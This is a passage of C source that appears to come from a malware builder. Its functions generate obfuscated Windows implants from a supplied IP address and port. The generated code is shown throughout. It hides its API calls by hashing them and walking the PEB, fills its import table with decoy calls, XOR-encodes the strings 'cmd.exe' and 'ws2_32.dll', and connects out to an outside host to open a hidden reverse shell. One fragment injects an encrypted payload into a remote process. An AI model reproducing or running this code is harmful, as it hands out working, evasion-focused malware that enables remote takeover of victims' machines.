        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    pCreateToolhelp32Snapshot = (funCreateToolhelp32Snapshot)GetProcAddressH(kernel, CreateToolhelp32Snapshot_djb2);\n"
        "    pProcess32First = (funProcess32First)GetProcAddressH(kernel, Process32First_djb2);\n"
        "    pProcess32Next = (funProcess32Next)GetProcAddressH(kernel, Process32Next_djb2);\n"
        "    pOpenProcess =(funOpenProcess)GetProcAddressH(kernel, OpenProcess_djb2);\n"
        "    plstrcmpiA = (funlstrcmpiA)GetProcAddressH(kernel, lstrcmpiA_djb2);\n"
        "    pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    pWriteProcessMemory = (funWriteProcessMemory)GetProcAddressH(kernel, WriteProcessMemory_djb2);\n"
        "    pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "}\n"
        "VOID start() {\n"
        "    insialize_struct();\n"
        "    int pid = 0;\n"

        "    obf((char*)pRprocess, sizeof(pRprocess), xkey, sizeof(xkey)); \n"
        "    pid = FindTarget(pRprocess);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            RC4_Guard(HINT_BYTE, ProtectedKey, EncryptedPayload, sizeof(ProtectedKey), sizeof(EncryptedPayload) );\n"
        "            Inject(hProc, EncryptedPayload, payload_len);\n"
        "            pNtClose(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "     start();\n"
        "     return 0;\n"
        "}\n",
        xkey, obfuscated_fun, Remotprocess, shellcodeArray, keyArray, hint
    );
}


void _source_1_tcp_3_time(char* payload, size_t size, const char* ip, const char* port_str) {

    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define KERNEL32_djb2               0x84BD0AA5\n"
        "#define NTDLL_djb2                  0xC9D1067D\n"
        "#define LoadLibraryA_djb2           0x0E32C08B\n"
        "#define WSAStartup_djb2             0xB703C453\n"
        "#define WSASocketA_djb2             0x5F3B12CA\n"
        "#define inet_pton_djb2              0xBD120405\n"
        "#define htons_djb2                  0x17387BA1\n"
        "#define connect_djb2                0x13BF4FDF\n"
        "#define closesocket_djb2            0xF77E6C94\n"
        "#define WSACleanup_djb2             0x9CA98668\n"
        "#define CreateProcessA_djb2         0x579FB1E9\n"
        "#define WaitForSingleObject_djb2    0x9557AB2A\n"
        "#define CloseHandle_djb2            0xCE995EF7\n"
        "#define NtDelayExecution_djb2       0x50DCFD5A\n"
        "#define NtWaitForSingleObject_djb2  0x2131236C\n"
        "#define NtClose_djb2                0x7E1EA2ED\n\n"

        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* inet_pton_t)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
        "typedef int (WINAPI* connect_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 5429         \n"
        "#define INITIAL_SEED 6\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB					pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB					pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char ip[] = {%s};\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"


        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "inet_pton_t pinet_pton;\n"
        "htons_t phtons;\n"
        "connect_t pconnect;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtDelayExecution_t pNtDelayExecution;\n"
        "funNtClose_t pNtClose;\n\n"
        "void zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "void delayEx(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "void connect_and_execute() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -50000;\n"
        "    int i = 0;\n"
        "    while (1) {\n"
        "        WSADATA wsaData;\n"
        "        pWSAStartup(MAKEWORD(2, 2), &wsaData);\n"
        "        SOCKET sock = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "        if (sock == INVALID_SOCKET) {\n"
        "            pWSACleanup();\n"
        "        }\n"
        "        struct sockaddr_in server;\n"
        "        server.sin_family = AF_INET;\n"
        "        server.sin_port = phtons(%d);\n"

        "    obf((char*)ip, sizeof(ip), xkey, sizeof(xkey));\n"
        "        pinet_pton(AF_INET, ip, &server.sin_addr);\n"



        "        if (pconnect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {\n"
        "            pclosesocket(sock);\n"
        "            pWSACleanup();\n"
        "        }\n"
        "        STARTUPINFO si;\n"
        "        PROCESS_INFORMATION pi;\n"
        "        zero_memory(&si, sizeof(si));\n"
        "        si.cb = sizeof(si);\n"
        "        si.dwFlags = STARTF_USESTDHANDLES;\n"
        "        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;\n"
        "        pCreateProcessA(NULL, cmd , NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);\n"
        "        i++;\n"
        "        if (i == 3) {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(sock);\n"
        "            pWSACleanup();\n"
        "            break;\n"
        "        }\n"
        "        else {\n"
        "            pNtWaitForSingleObject(pi.hProcess, FALSE, NULL);\n"
        "            pNtClose(pi.hProcess);\n"
        "            pNtClose(pi.hThread);\n"
        "            pclosesocket(sock);\n"
        "            pWSACleanup();\n"
        "            delayEx(0.1);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"
        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    pinet_pton = (inet_pton_t)GetProcAddressH(hWs2_32, inet_pton_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pconnect = (connect_t)GetProcAddressH(hWs2_32, connect_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtDelayExecution = (funNtDelayExecution_t)GetProcAddressH(ntdll_32, NtDelayExecution_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    Inisialize_struct();\n"
        "    connect_and_execute();\n"
        "    return 0;\n"
        "}\n",
        xkey, obf_ip, obf_cmd, obf_ws2dll, port
    );
}
void _source_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define WSAStartup_djb2                 0x5925BC50\n"
        "#define WSASocketA_djb2                 0xE2F31987\n"
        "#define inet_pton_djb2                  0xB9D29D42\n"
        "#define htons_djb2                      0xBC98541E\n"
        "#define connect_djb2                    0x068FB8DC\n"
        "#define closesocket_djb2                0x65188A91\n"
        "#define WSACleanup_djb2                 0xE6AD20A5\n"
        "#define CreateProcessA_djb2             0x4CA64FE6\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
        "typedef int (WINAPI* connect_t)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* closesocket_t)(SOCKET);\n"
        "typedef int (WINAPI* WSACleanup_t)(void);\n"
        "typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);\n"
        "typedef int (WSAAPI* inet_pton_t)(INT, PCSTR, PVOID);\n\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject_t)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* funNtClose_t)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB					pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB					pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char ip[] = {%s};\n"
        "char cmd[] = {%s};\n"
        "char ws2[] = {%s};\n"

        "WSAStartup_t pWSAStartup;\n"
        "WSASocketA_t pWSASocketA;\n"
        "inet_pton_t pinet_pton;\n"
        "htons_t phtons;\n"
        "connect_t pconnect;\n"
        "closesocket_t pclosesocket;\n"
        "WSACleanup_t pWSACleanup;\n"
        "CreateProcessA_t pCreateProcessA;\n"
        "funNtWaitForSingleObject_t pNtWaitForSingleObject;\n"
        "funNtClose_t pNtClose;\n\n"
        "VOID my_zero_memory(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID connect_and_execute() {\n"
        "    obf((char*)cmd, sizeof(cmd), xkey, sizeof(xkey));\n"
        "    obf((char*)ip, sizeof(ip), xkey, sizeof(xkey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    pWSAStartup(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = phtons(%d);\n"

        "    pinet_pton(AF_INET, ip, &remot_addr.sin_addr);\n"
        "    if (pconnect(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        pclosesocket(socket);\n"
        "        pWSACleanup();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    my_zero_memory(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"

        "    if (pCreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        pNtWaitForSingleObject(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    pNtClose(pi.hProcess);\n"
        "    pNtClose(pi.hThread);\n"
        "    pclosesocket(socket);\n"
        "    pWSACleanup();\n"
        "}\n"
        "BOOL Inisialize_struct() {\n"
        "    HMODULE hKernel32 = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll_32 = GetModuleHandleH(NTDLL_djb2);\n"
        "    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)GetProcAddressH(hKernel32, LoadLibraryA_djb2);\n"
        "    obf((char*)ws2, sizeof(ws2), xkey, sizeof(xkey));\n"
        "    HMODULE hWs2_32 = pLoadLibraryA(ws2);\n"
        "    pWSAStartup = (WSAStartup_t)GetProcAddressH(hWs2_32, WSAStartup_djb2);\n"
        "    pWSASocketA = (WSASocketA_t)GetProcAddressH(hWs2_32, WSASocketA_djb2);\n"
        "    pinet_pton = (inet_pton_t)GetProcAddressH(hWs2_32, inet_pton_djb2);\n"
        "    phtons = (htons_t)GetProcAddressH(hWs2_32, htons_djb2);\n"
        "    pconnect = (connect_t)GetProcAddressH(hWs2_32, connect_djb2);\n"
        "    pclosesocket = (closesocket_t)GetProcAddressH(hWs2_32, closesocket_djb2);\n"
        "    pWSACleanup = (WSACleanup_t)GetProcAddressH(hWs2_32, WSACleanup_djb2);\n"
        "    pCreateProcessA = (CreateProcessA_t)GetProcAddressH(hKernel32, CreateProcessA_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject_t)GetProcAddressH(ntdll_32, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (funNtClose_t)GetProcAddressH(ntdll_32, NtClose_djb2);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    Inisialize_struct();\n"
        "    connect_and_execute();\n"
        "    return 0;\n"
        "}\n",
        xkey, obf_ip, obf_cmd, obf_ws2dll, port
    );
}
void _source_2_tcp__time_dll(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define WSAStartup_djb2                 0x5925BC50\n"
        "#define WSASocketA_djb2                 0xE2F31987\n"
        "#define inet_pton_djb2                  0xB9D29D42\n"
        "#define htons_djb2                      0xBC98541E\n"
        "#define connect_djb2                    0x068FB8DC\n"
        "#define closesocket_djb2                0x65188A91\n"
        "#define WSACleanup_djb2                 0xE6AD20A5\n"
        "#define CreateProcessA_djb2             0x4CA64FE6\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "typedef int (WINAPI* WSAStartup_t)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef u_short(WINAPI* htons_t)(u_short);\n"
